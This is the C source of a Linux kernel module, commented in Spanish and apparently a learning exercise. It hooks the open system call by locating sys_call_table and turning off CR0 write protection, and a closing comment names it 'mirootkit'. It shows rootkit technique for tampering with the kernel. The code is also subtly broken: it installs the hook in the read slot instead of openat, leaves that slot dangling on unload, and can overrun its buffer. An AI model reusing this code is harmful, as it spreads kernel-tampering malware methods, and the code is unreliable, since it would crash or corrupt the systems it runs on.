#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Elias");
MODULE_DESCRIPTION("Enganche (hook) de la llamada al sistema open");
MODULE_VERSION("1.0");


unsigned long **SYS_CALL_TABLE;



void EnablePageWriting(void){
	write_cr0(read_cr0() & (~0x10000));

} 
void DisablePageWriting(void){
	write_cr0(read_cr0() | 0x10000);

} 


//definimos nuestra funcion original. 
asmlinkage int ( *original_open ) (int dirfd, const char *ruta, int flags); 
// Creamos nuestra propia funcion Open 
asmlinkage int	HookOpen(int dirfd, const char *ruta, int flags){

char letra;
int i = 0;

char directory[255];
char OurFile[14] = "fichero"; 


while (letra != 0 || i < 6){ // Si (letra == 0x41 || letra < 0x7a) para prevenir que caracteres basura entren en la cadena del buffer
	//Este macro copia una unica variable simple desde el espacio del usuario al espacio del kernel, similar a put_user
	//Esto copiara ruta[i] a ch;
	get_user(letra, ruta+i);
	directory[i] = letra ;
	i++;
	}

	if (strcmp(OurFile , directory ) == 0 ){
		printk(KERN_INFO "Fichero accedido! %s", directory);
	}
	memset(directory, 0, 255);

	// En las ultimas versiones parece ser que se llama openat y no open, esto lo he visto haciendo "strace cat fichero"
	// Salto a open original
	return (*original_open)(dirfd, ruta, flags);
}




//Esto es igual que en el hook de la llamada read

static int __init SetHooks(void) {
    // Conseguimos el puntero de la tabla de llamadas al sistema = Syscall Table ** 
    SYS_CALL_TABLE = (unsigned long**)__symbol_get("sys_call_table");

    printk(KERN_INFO "Los gnachos estaran listos. \n");
    printk(KERN_INFO "System call table en %p", SYS_CALL_TABLE);

    EnablePageWriting(); // esto nos permitira hacer los cambios que necesitemos a la syscall 


    // Reemplaza el Puntero de la Syscall_read en nuestra sys_call
    original_open = (void*)SYS_CALL_TABLE[__NR_openat];
    SYS_CALL_TABLE[__NR_read] = (unsigned long*)HookOpen;
    DisablePageWriting(); // vuelve a ser segura

    return 0; 

}
        
    
    // Cuando descarguemos (desactivemos) nuestro modulo, es decir, el driver, volveremos a dejar la tabla de sys_calls como estaba
static void __exit HookCleanup(void) {
    EnablePageWriting();
    SYS_CALL_TABLE[__NR_openat] = (unsigned long*)original_open; // de vuelta a la llamada original
    DisablePageWriting();

    printk(KERN_INFO "Ganchos limpios!");

}


module_init(SetHooks);
module_exit(HookCleanup);

// sudo insmod mirootkit.ko
// cat fichero
// tail -n 50 /var/log/syslog
